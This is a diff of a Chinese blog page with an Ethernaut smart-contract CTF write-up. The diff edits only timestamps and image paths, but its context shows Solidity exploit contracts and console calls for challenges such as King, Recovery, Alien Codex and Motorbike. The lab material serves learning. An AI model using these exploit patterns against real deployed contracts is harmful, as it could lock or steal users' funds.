@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
 <meta property="article:published_time" content="2023-02-22T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-23T13:34:53.580Z">
+<meta property="article:modified_time" content="2023-02-23T13:40:06.430Z">
 <meta property="article:author" content="Banana69">
 <meta property="article:tag" content="智能合约 CTF">
 <meta name="twitter:card" content="summary">
@@ -54,7 +54,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2023-02-23 21:34:53'
+  postUpdate: '2023-02-23 21:40:06'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -180,7 +180,7 @@
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.utils.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure>
 
 <p>以下是俩种调用方式的区别：</p>
-<p><img src="/image/Ethernaut.assets/image/Ethernaut.assets-20220902101423276.png" alt="image-20220902101423276"></p>
+<p><img src="/image/Ethernaut.assets/image-20220902101423276.png" alt="image-20220902101423276"></p>
 <h3 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这道题目要求合约中的余额大于0。使用<code>selfdestruct</code>方法就可以强制将合约中的余额转入某个账户。</p>
@@ -198,7 +198,7 @@
 
 <p>该合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价。阻止其他人重获王位来通过这一关。</p>
 <p>在<code>receive</code>函数中可以接收 prize，当prize 大于当前的 king 的prize时就会成为king，如果要阻止其他人成为king，可以在fallback 或者 receive 函数中写入 <code>revert()</code>，使<code>king.transfer(msg.value)</code>失败。</p>
-<p><img src="/image/Ethernaut.assets/image/Ethernaut.assets-20220903131148062.png" alt="image-20220903131148062"></p>
+<p><img src="/image/Ethernaut.assets/image-20220903131148062.png" alt="image-20220903131148062"></p>
 <p>在创建后的第一个king 的prize 为 0.001 ether，只要发送大于 0.001的 ether即可</p>
 <p>攻击合约：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(address payable _King) payable public &#123;</span><br><span class="line">        _King.call.value(1 ether).gas(1000000)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() payable external&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -302,7 +302,7 @@
 <h3 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>完成这道题目的要求是找到丢失的合约地址找回丢失的0.5个以太币。思路是可以通过在<code>https://rinkeby.etherscan.io/</code>中查询<code>Recover</code>合约对应的地址，查看该合约的 <strong>Internal Txns</strong>从中找到创建的<code>SimpleToken</code>合约的地址。</p>
-<p><img src="/image/Ethernaut.assets/image/Ethernaut.assets-20220922133444783.png" alt="image-20220922133444783"></p>
+<p><img src="/image/Ethernaut.assets/image-20220922133444783.png" alt="image-20220922133444783"></p>
 <p>在获取到<code>SimpleToken</code>地址后就可以调用合约中的 <code>destory</code>函数即可。</p>
 <p>攻击合约：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface SimpleToken &#123;</span><br><span class="line">    function destroy(address payable _to) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    address SimpleTokenAddr;</span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        SimpleTokenAddr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        SimpleToken(SimpleTokenAddr).destroy(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -356,7 +356,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        emit OwnershipTransferred(address(0), _owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0));</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>   在<code>Ownable</code>合约中有一个 address类型的变量  <code>_Owner</code>，只占用20字节，所有变量 <code>contact</code>和其存储在一个插槽中即存放在 slot 0中，而<code>codex.length</code>存储在 slot 1中，由于在合约初始化后动态数据为空，所以slot 1为 0，可以思考利用 <code>record</code>函数向动态数组中写入内容，覆盖掉 slot 0的低位的20字节，将其未覆盖为 player 的地址。</p>
-<p><img src="/image/Ethernaut.assets/image/Ethernaut.assets-20220711212845554.png" alt="image-20220711212845554"></p>
+<p><img src="/image/Ethernaut.assets/image-20220711212845554.png" alt="image-20220711212845554"></p>
 <ol>
 <li><p>由于slot 1的初始值为0，调用<code>retract</code>函数可以让<code>codex.length</code>减1，代码中没有对动态数组的长度进行溢出检查，可以让slot 1 存储的值下溢，slot 1 的值为$2^{256}-1$</p>
 <blockquote>
@@ -443,7 +443,7 @@
 <p>在成为 owner 后调用<code>addToWhitelist</code>，将 player 添加到白名单中</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.addToWhitelist(player);</span><br><span class="line"><span class="keyword">await</span> contract.whitelisted(player);</span><br></pre></td></tr></table></figure>
 
-<p><img src="/image/Ethernaut.assets/image/Ethernaut.assets-20230115185459052.png" alt="image-20230115185459052"></p>
+<p><img src="/image/Ethernaut.assets/image-20230115185459052.png" alt="image-20230115185459052"></p>
 <p>我们的最终目的是成为<code>PuzzleProxy</code>合约的owner，因此可以利用相同的漏洞在<code>PuzzleWallet</code>中使用 <code>delegatecall</code>修改<code>maxBalance</code>，由于在<code>init</code>函数中对 maxBalance 的值有限制，我们只能调用<code>setMaxBalance</code>函数，而要调用这个函数，就需要使合约中的余额清零。由合约代码可知，<code>execute</code>取款函数在取款时检查了我们的余额，我们只能取出自己存入的余额，而合约初始就有0.001ether，只靠这个函数是无法让合约余额清0的。需要使用<code>multicall</code>函数。</p>
 <p><code>multicall</code>函数允许用户将多个调用一起处理以达到节省 gas 的目的，该函数通过一下代码检查是否是第一次调用<code>deposit</code>函数，通过判断目前执行的方法的函数选择器是否与deposit的函数选择器一致，因此我们只能调用一次<code>deposit</code>函数。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
@@ -460,7 +460,7 @@
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MotorBikeAddr = <span class="string">&quot;0x341f91ADf4e053242098f321D0aB9845d127F4A7&quot;</span></span><br><span class="line"><span class="keyword">const</span> slot = <span class="string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span></span><br><span class="line"><span class="keyword">const</span> EngineAddr = <span class="keyword">await</span> provider.getStorageAt(MotorBikeAddr, slot)</span><br><span class="line"><span class="comment">// 0x000000000000000000000000a75ad15322afa9a93a3dcb10b80accac24a7a3a3</span></span><br></pre></td></tr></table></figure>
 
 <p>然后再读区一下<code>Enginr</code>合约中的<code>upgrader和horsePower</code>变量的内容。</p>
-<p><img src="/image/Ethernaut.assets/image/Ethernaut.assets-20230223164319975.png" alt="image-20230223164319975"></p>
+<p><img src="/image/Ethernaut.assets/image-20230223164319975.png" alt="image-20230223164319975"></p>
 <p>他们的内容都为 <code>0</code>，说明此时<code>Engine</code>合约还没有执行<code>initialize()</code>函数，因此，我们可以通过外部调用<code>Engine</code>合约的<code>initialize()</code>函数，来让<code>Engine</code>合约的upgrader变成我们的地址。</p>
 <p>又由于<code>upgradeToAndCall</code>函数调用了<code>_upgradeToAndCall</code>函数，而<code>_upgradeToAndCall</code>内部执行了</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success,) = newImplementation.delegatecall(data);</span><br></pre></td></tr></table></figure>
